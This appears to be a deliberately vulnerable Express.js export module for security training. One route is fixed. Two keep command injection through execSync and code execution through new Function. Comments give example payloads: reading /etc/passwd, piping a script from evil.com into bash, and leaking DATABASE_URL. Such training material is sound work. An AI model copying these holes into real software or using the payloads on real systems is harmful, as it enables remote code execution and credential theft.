// ============================================================
// VULNERABILITY #12: Insecure Deserialization + Command Injection (CWE-502 / CWE-78)
// Attacker can execute arbitrary commands through unsafe eval/deserialization
// ============================================================

const express = require('express');
const router = express.Router();
const { execSync } = require('child_process');

// Helper function to safely parse filter JSON string
function safeParseFilter(filter) {
  try {
    // Only allow JSON objects with simple operators
    const parsed = JSON.parse(filter);
    // Basic validation: parsed must be an object
    if (typeof parsed !== 'object' || parsed === null || Array.isArray(parsed)) {
      throw new Error('Filter must be a JSON object');
    }
    return parsed;
  } catch (e) {
    throw new Error('Filter must be a valid JSON string representing an object');
  }
}

// POST /api/export/query
// Body: { "filter": "{\"amount\": {\"$gt\": 1000}}" }
// Fixed: Removed eval() and replaced with safe JSON parsing and validation
router.post('/query', (req, res) => {
  const { filter, format } = req.body;

  if (!filter) {
    return res.status(400).json({ error: 'Filter expression is required' });
  }

  try {
    // FIXED: Removed unsafe eval() on user input to prevent remote code execution
    // Instead, parse filter as JSON with validation
    const parsedFilter = safeParseFilter(filter);

    // Simulate filtered data export
    const mockData = [
      { id: 1, account: 'ACC-001', amount: 5000, date: '2026-01-15' },
      { id: 2, account: 'ACC-002', amount: 12000, date: '2026-01-20' },
      { id: 3, account: 'ACC-003', amount: 800, date: '2026-02-01' },
    ];

    res.json({
      format: format || 'json',
      results: mockData,
      filter_applied: JSON.stringify(parsedFilter),
    });
  } catch (err) {
    res.status(400).json({ error: `Invalid filter expression: ${err.message}` });
  }
});

// VULNERABLE: Command Injection in PDF export via filename
// GET /api/export/pdf?filename=report;cat /etc/passwd
router.get('/pdf', (req, res) => {
  const { filename } = req.query;
  const reportName = filename || 'transaction-report';

  try {
    // VULNERABLE: User input directly in shell command
    // Attacker: ?filename=report;curl http://evil.com/shell.sh|bash
    const command = `echo "Generating PDF: ${reportName}" && date`;
    const output = execSync(command, { encoding: 'utf-8', timeout: 5000 });

    res.json({
      success: true,
      message: `PDF export initiated for: ${reportName}`,
      debug: output,
    });
  } catch (err) {
    res.status(500).json({ error: `Export failed: ${err.message}` });
  }
});

// VULNERABLE: Template injection via user-controlled template string
// POST /api/export/custom
router.post('/custom', (req, res) => {
  const { template, data } = req.body;

  if (!template) {
    return res.status(400).json({ error: 'Template string is required' });
  }

  try {
    // VULNERABLE: new Function() with user input - Code execution
    // Attacker: { "template": "return process.env.DATABASE_URL" }
    const renderer = new Function('data', template);
    const result = renderer(data || {});

    res.json({ rendered: result });
  } catch (err) {
    res.status(400).json({ error: `Template error: ${err.message}` });
  }
});

module.exports = router;